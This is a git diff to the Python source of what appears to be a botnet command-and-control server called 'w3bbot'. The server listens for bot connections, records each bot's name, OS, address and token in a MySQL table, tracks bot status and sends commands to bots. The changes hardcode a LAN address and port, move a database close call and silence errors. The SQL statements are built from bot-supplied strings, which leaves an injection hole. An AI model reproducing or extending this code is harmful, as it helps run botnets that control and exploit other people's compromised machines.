@@ -118,16 +118,17 @@ def Base_Connection(host, port):
   thread.start_new_thread(Comand_Taccept, ())
 
 
-def Recive_Command(clients, mysql_host, mysql_user, mysql_pass, mysql_db):
+def Recive_Command(mysql_host, mysql_user, mysql_pass, mysql_db):
 
   w3bbot_sql = _mysql.connect(mysql_host, mysql_user, mysql_pass, mysql_db)
-  
+
   while True:
+
     for bot in clients:
       
       try:
         
-        bot_data = bot.recv(512)
+        bot_data = bot.recv(1024)
 
       except Exception as recive_command_socket_error:
         
@@ -141,8 +142,7 @@ def Recive_Command(clients, mysql_host, mysql_user, mysql_pass, mysql_db):
         ping_query = str('UPDATE Bot_Data SET bot_status=%i WHERE bot_address="%s"' %(ping_value, bot_address)) # editar depois usar a conn na db 
         
         w3bbot_sql.query(ping_query)
-        w3bbot_sql.close()
-
+        
         return True
       
       elif(bot_data.split('{')[0] == 'Server.RG'): # Server.RG{pc_name, bot_os, addrres}
@@ -155,13 +155,15 @@ def Recive_Command(clients, mysql_host, mysql_user, mysql_pass, mysql_db):
         register_query = str('INSERT INTO Bot_Data(bot_address, bot_name, bot_osystem, bot_status, bot_token) VALUES("%s", "%s", "%s", 1, "%s")' %(bot_address, bot_name, bot_os, bot_token))
 
         w3bbot_sql.query(register_query)
-        w3bbot_sql.close()
-
+        
         return True
       
       else:
-        
+
         return False
+          
+  
+  w3bbot_sql.close()
 
 
 def Send_Command(command, bot):
@@ -207,7 +209,7 @@ def main():
   global clients
   clients = []
 
-  host_ip = str(socket.gethostbyname(socket.gethostname()))
+  host_ip = str('192.168.0.13')
   host_port = int(9878)
 
   mysql_host = str('127.0.0.1')
@@ -217,7 +219,7 @@ def main():
 
   Base_Connection(host_ip, host_port)
 
-  thread.start_new_thread(Recive_Command, (clients, mysql_host, mysql_user, mysql_pass, mysql_db, ))
+  thread.start_new_thread(Recive_Command, (mysql_host, mysql_user, mysql_pass, mysql_db, ))
 
   while(True):
 
@@ -227,19 +229,10 @@ def main():
 
     except Exception as main_decode_error:
       
-      Error_logger(main_decode_error)
+      pass
 
 
 if __name__ == '__main__':
   main()
 
-'''
-
-get_loop = bool(True)
-
-while(get_loop):
-
-get_loop = Decode_BConfig_File()
-
-importante tambem lembrar para reutilizar o address no socket pra toda hr nao ter que esperar pra krl !!!
-'''
+#importante tambem lembrar para reutilizar o address no socket pra toda hr nao ter que esperar pra krl !!!
